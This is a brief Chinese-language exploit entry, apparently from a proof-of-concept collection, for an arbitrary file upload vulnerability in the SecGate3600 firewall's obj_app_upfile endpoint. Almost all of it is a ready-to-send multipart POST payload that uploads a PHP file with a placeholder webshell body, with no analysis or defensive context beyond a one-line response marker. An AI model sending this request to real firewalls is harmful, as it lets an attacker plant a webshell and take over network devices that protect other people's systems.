# 网神SecGate3600防火墙obj_app_upfile任意文件上传漏洞

网神SecGate3600防火墙obj_app_upfile ｜ 文件上传 ｜ —
- **请求**：`POST /?g=obj_app_upfile HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"
10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="upfile"; filename="vulntest.php"
Content-Type: text/plain
<?php php马?>
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"
obj_app_upfile
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="__hash__"
0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
```
- **响应特征**：-1